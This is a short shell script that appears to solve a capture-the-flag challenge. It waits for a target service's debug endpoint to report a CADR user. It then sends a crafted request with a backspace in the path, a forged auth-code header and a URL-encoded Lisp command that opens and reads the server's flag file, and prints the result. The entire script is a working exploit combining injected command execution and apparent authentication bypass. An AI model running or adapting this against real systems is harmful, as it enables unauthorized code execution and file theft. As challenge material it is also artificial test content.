#!/bin/sh -e

PAYLOAD="%28with-open-file%20%28flag%20%22server%3A//tree//flag%22%29%20%28readline%20flag%20nil%29%29"

sleep 2
until curl http://$1:$2/debug | grep "user: CADR" ; do
    printf '.'
    sleep 2
done


FLAG=$(curl -m 30 $(python3 -c "print('http://$1:$2/\x08?burnham=t&cmd=$PAYLOAD')") -H "auth-code: z")

echo "FLAG: $(echo "$FLAG" | awk 'NF>1{print $NF}')"
